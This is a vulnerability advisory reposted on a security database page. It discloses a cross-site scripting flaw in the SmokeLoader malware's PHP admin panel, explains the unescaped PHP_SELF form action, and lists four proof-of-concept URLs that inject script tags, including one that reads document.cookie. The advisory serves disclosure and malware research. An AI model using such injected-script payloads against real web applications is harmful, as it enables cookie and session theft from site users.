---
title: Panel.SmokeLoader MVID-2024-0681 Cross Site Scripting
url: https://cxsecurity.com/issue/WLB-2024050053
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2024-05-20
fetch_date: 2025-10-06T16:48:28.812429
---

# Panel.SmokeLoader MVID-2024-0681 Cross Site Scripting

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Panel.SmokeLoader MVID-2024-0681 Cross Site Scripting** **2024.05.19**  Credit:  **[malvuln](https://cxsecurity.com/author/malvuln/1/)**  Risk: **Low**  Local: **No**  Remote: ****Yes****  CVE: **N/A**  CWE: **[CWE-79](https://cxsecurity.com/cwe/CWE-79 "Click to see CWE-79")** | |

Discovery / credits: Malvuln (John Page aka hyp3rlinx) (c) 2024
Original source: https://malvuln.com/advisory/4b5fc3a2489985f314b81d35eac3560f.txt
Contact: malvuln13@gmail.com
Media: twitter.com/malvuln
Threat: Panel.SmokeLoader
Vulnerability: Cross Site Scripting (XSS)
Family: SmokeLoader
Type: Web Panel
MD5: 4b5fc3a2489985f314b81d35eac3560f (control.php)
SHA256: 8d02238577081be74b9ebc1effcfbf3452ffdb51f130398b5ab875b9bfe17743
Vuln ID: MVID-2024-0681
Disclosure: 05/11/2024
Description: The smokebot admin web panel is written in PHP for remote administration capability. The panel has multiple features like Bot List, Task List, Stealer, Miner, Email Grab, KeyLogger etc. The "control.php" PHP page contains an HTML FORM that uses $\_SERVER["PHP\_SELF"] for the form action method. This is a super global variable that returns the filename of the currently executing script. There is no secure coding practices of filtering input or sanitization of output e.g "htmlspecialchars()". Therefore, panel users who visit a third-party adversary website or click an infected link, can trigger arbitrary client side JS code execution in the security context of the current user. This can result in data theft or GEO location disclosure of the user accessing the smokebot web interface.
PHP snippet.
if ($\_GET["mode"] === "reports"){
$url\_pattern = $\_GET["logs\_sru"];
$id\_pattern = $\_GET["logs\_sri"];
$action = $\_SERVER["PHP\_SELF"]."?page=stealer&mode=reports";
%3Cform method=\"get\" action=\"{$action}\"%3E
Interestingly, they use PHP function htmlspecialchars() when retrieving data from the "smoke bot" MySQL database.
$r = mysqli\_query($dbcon,"SELECT \* FROM `stealer` WHERE `cname`='{$id}'");
while ($v = mysqli\_fetch\_assoc($r)){
$stealer\_host = htmlspecialchars($v["host"]);
However, it doesn't wrap $\_SERVER["PHP\_SELF"] on the action method for the FORM {$action} variable that handles user input.
Exploit/PoC:
1) http://x.x.x.x/SmokeLoader/control1.php?page=stealer&mode=reports&logs\_sri=%22/%3E%3Cscript%3Ewindow.open("https://malvuln.com")%3C/script%3E&logs\_sru=&next=1
2) http://x.x.x.x/SmokeLoader/control1.php?page=fgrab&mode=reports&forms\_sri=%22/%3E%3Cscript%3Ealert((document.cookie)%3C/script%3E
3) http://x.x.x.x/SmokeLoader/control1.php?page=fgrab&mode=reports&forms\_sru=%22/%3E%3Cscript%3Ewindow.open('https://hyp3rlinx.altervista.org/')%3C/script%3E
4) http://x.x.x.x/SmokeLoader/control1.php?page=fgrab&mode=reports&forms\_srd=%22/%3E%3Cscript%3Ealert(%22malvuln%22)%3C/script%3E
Disclaimer: The information contained within this advisory is supplied "as-is" with no warranties or guarantees of fitness of use or otherwise. Permission is hereby granted for the redistribution of this advisory, provided that it is not altered except by reformatting it, and that due credit is given. Permission is explicitly given for insertion in vulnerability databases and similar, provided that due credit is given to the author. The author is not responsible for any misuse of the information contained herein and accepts no responsibility for any damage caused by the use or misuse of this information. The author prohibits any malicious use of security related information or exploits by the author or elsewhere. Do not attempt to download Malware samples. The author of this website takes no responsibility for any kind of damages occurring from improper Malware handling or the downloading of ANY Malware mentioned on this website or elsewhere. All content Copyright (c) Malvuln.com (TM).

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2024050053)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top